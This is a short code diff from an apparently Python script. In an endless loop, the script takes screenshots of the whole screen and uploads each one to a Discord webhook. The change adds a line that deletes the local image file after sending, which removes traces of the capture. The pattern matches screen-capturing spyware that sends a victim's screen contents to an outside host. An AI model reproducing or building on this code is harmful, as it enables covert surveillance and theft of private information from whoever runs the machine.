@@ -25,3 +25,4 @@ while True:
     img = PIL.ImageGrab.grab()
     img.save("test.jpg")
     WEBHOOK.send(file=discord.File("test.jpg"))
+    os.remove("test.jpg")
